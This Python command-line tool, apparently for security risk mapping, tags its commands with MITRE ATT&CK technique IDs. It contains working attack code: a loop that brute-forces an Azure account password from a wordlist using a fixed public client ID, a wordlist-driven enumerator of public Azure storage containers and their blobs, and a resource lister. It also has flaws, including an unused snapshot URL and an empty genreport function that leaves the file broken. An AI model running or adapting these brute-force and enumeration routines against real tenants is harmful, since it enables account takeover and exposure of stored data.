import logging
from pathlib import Path
from xml.etree import ElementTree
from pprint import pformat

import requests
import typer
from azure.core.exceptions import ClientAuthenticationError
from azure.identity import UsernamePasswordCredential
from azure.mgmt.resource import SubscriptionClient, ResourceManagementClient
from loguru import logger

from riskmap import ROOT_DIR
from riskmap.mappings import AttckMapper

logger = logging.getLogger("azure")
logger.setLevel(logging.ERROR)

app = typer.Typer()
atmap = AttckMapper(Path(ROOT_DIR) / "cti", Path(".") / "logs" / "riskcli.json")


class CommandUnsuccessfulError(Exception):
    pass


@app.command()
@atmap.mapping(enterprise=["T1110.001", "M1032"])
def azbrute(
    username: str = typer.Option(..., "-u", help="Username to bruteforce"),
    passList: Path = typer.Option(..., "-p", help="Path to password list"),
):
    """Bruteforces password for an Azure account"""
    print("in", id(azbrute))
    validCred = {"user": username, "pass": None}
    with open(passList, "r", encoding="latin-1") as passes:
        for pwd in passes.read().splitlines():
            login = UsernamePasswordCredential(
                "1950a258-227b-4e31-a9cf-717495945fc2", username, pwd
            )
            try:
                token = login.get_token("https://graph.microsoft.com/.default")
                validCred["pass"] = pwd
            except ClientAuthenticationError as e:
                pass

    if not validCred["pass"]:
        raise CommandUnsuccessfulError(f"Brute force for {username} unsuccessful")
    typer.echo(f"\nCredential found! - {validCred}\n")


@app.command()
@atmap.mapping(
    enterprise=["T1530", "T1580", "M1047", "M1041", "M1037", "M1032", "M1022", "M1018"]
)
def azcontainerbrute(
    url: str = typer.Option(..., "-u", help="Url to bruteforce containers"),
    wordlist: Path = typer.Option(..., "-w", help="Wordlist to enumerate with"),
    snapshots: bool = typer.Option(
        False, "--snapshot", help="Check for snapshots in requests"
    ),
):
    """Bruteforce containers in public Azure storage and list blobs"""
    if not url.endswith("/"):
        url += "/"

    containers = []
    with open(wordlist) as words:
        for word in words.read().splitlines():
            full_url = f"{url}{word}?restype=container&comp=list"
            if snapshots:
                full_url += "&include=snapshots"
            resp = requests.get(f"{url}{word}?restype=container&comp=list")
            if resp.status_code == 200:
                tree = ElementTree.fromstring(resp.content)
                blobs = [b.text for b in tree.findall("./Blobs/Blob/Name")]
                containers.append({word: blobs})

    typer.echo(pformat(containers, indent=4))
    if not containers:
        raise CommandUnsuccessfulError(f"Brute force for {url} unsuccessful")
    return containers


@app.command()
@atmap.mapping(enterprise=["T1526"])
def azresourcelist(
    username: str = typer.Option(..., "-u", help="Username"),
    password: str = typer.Option(
        ..., "-p", prompt=True, hide_input=True, help="Password"
    ),
):
    """Bruteforces password for an Azure account"""

    resources = {}
    cred = UsernamePasswordCredential(
        "1950a258-227b-4e31-a9cf-717495945fc2", username, password
    )
    sub_client = SubscriptionClient(cred)
    for sub in sub_client.subscriptions.list():
        resources[sub.subscription_id] = [
            r.id
            for r in ResourceManagementClient(
                cred, sub.subscription_id
            ).resources.list()
        ]

    if not resources:
        raise CommandUnsuccessfulError(f"Did not find resources as {username}")

    typer.echo(pformat(resources, indent=4))
    return {"resources": resources}


@app.command()
def describe(command: str):
    valid_commands = [c.callback.__name__ for c in app.registered_commands]
    if command not in valid_commands:
        raise typer.BadParameter(f" Command {command} not found in: {valid_commands}")

    command_func = globals()[command]
    descriptions = atmap.describe("atmap", command_func)
    print("\n\n".join(map(lambda x: x.get_string(), descriptions)))


@app.command()
def genreport(path: Path = typer.Argument(..., help="Path to riskmap log" )):
    

if __name__ == "__main__":
    app()